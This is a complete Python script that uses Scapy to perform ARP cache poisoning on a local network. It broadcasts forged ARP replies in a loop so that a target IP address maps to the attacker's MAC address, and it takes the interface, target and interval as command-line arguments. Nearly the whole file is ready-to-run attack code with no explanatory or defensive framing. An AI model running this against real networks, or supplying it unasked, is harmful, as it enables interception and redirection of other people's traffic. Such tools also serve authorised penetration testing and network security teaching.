#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
ARP cache poisoning implementation using Scapy.
"""

from argparse import ArgumentParser
from os import geteuid
from scapy.all import *
from sys import exit as sysexit
from time import sleep

def arp_mitm(interface, target, interval=10.0):
    """
    ARP cache poisoning attack.
    """

    myMAC = get_if_hwaddr(interface)
    while 1:
        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
        sleep(interval)

if __name__ == "__main__":
    ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
    ap.add_argument("-i", "--interface", required=True, help="network interface to use")
    ap.add_argument("-t", "--target", required=True, help="target's IP address")
    ap.add_argument("-I", "--interval", type=float, default=10.0, help="seconds between two ARP frames (default: 10.0s)")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        sysexit("[!] You must be root")

    try:
        print("[*] Starting the ARP MITM attack...")
        arp_mitm(args["interface"], args["target"], args["interval"])
    except IOError:
        sysexit("[!] Interface doesn't exist")
    except KeyboardInterrupt:
        print("\n[*] Stopping the ARP MITM attack")
